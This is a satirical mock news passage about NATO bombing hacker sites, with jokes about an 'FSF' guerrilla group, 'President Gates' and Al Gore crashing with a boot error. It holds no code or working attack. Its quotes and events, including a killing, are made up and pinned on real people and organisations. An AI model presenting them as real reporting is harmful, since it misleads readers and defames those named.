      "Now, [crackers will] attack all the media sites, plastering the entire web with links to porno and warez sites,
      and lag the whole net to hell", said hacker Frodo Majere. "If NATO thinks they will bend hackers with bombs,
      they are dead wrong."
      
      Supporters of the infamous jailed hacker Kevin Mitnick have reportedly been preparing to strike at well-known
      pro-NATO companies and military organizations as soon as the first NATO bomb lands on hacker territory.
      
      "We'll introduce Y2K bugs to systems where you'll never find them. We will end the disgusting
      greed-infested system of monopolist capitalism by freeing information forever. Linux is the One, True God,"
      said one hacker, before he was shot and killed by an enraged fanatic wearing a red "GNU NOT Linux"
      headband, symbol of the underground terrorist organization FSF. A press release issued by the FSF's guerilla
      leader, known only as RMS, claimed responsibility for the killing.
      
      NATO's secretary-general Javler Selena authorized airstrikes against known hacker sites on Tuesday, after
      hackers on the IRC channel #2600 rebuffed a last-ditch peace offer and gave out free root accounts on the
      whitehouse.gov server.
      
      "In the past, computer security was a war of escalation between system administrators and joy-riding
      hackers," said a spokesperson for the anti-hacker group Freedom Through Oppression. "It's high time we
      brought the war to the instigators and bombed these hacker scum back to the Stone Age. To make the Internet
      safe for everyone, we must squash dissension once and for all. Countries have been nuked for less."
      
      "If you don't stand up to the theft of intellectual property of innocent companies such as SysMicrosoft and
      AppMicrosoft, you threaten American competitiveness and the ability to innovate," said President Gates, as
      he sought -- and got -- support from congressional leaders for military action.
      
      "We must halt the hackers and save the Internet for our children and the future of our country. The dirty,
      despicable hackers will no longer disrupt websites to make fun of our institutions, or pollute the Information
      Superhighway with filthy swear words," said former Vice President Al Gore, founder of the Internet, before he
      suddenly toppled over and dumped core. "NTLDR not found. INVALID_BOOT_DEVICE in kernel32.exe
      006383dhX00029393."
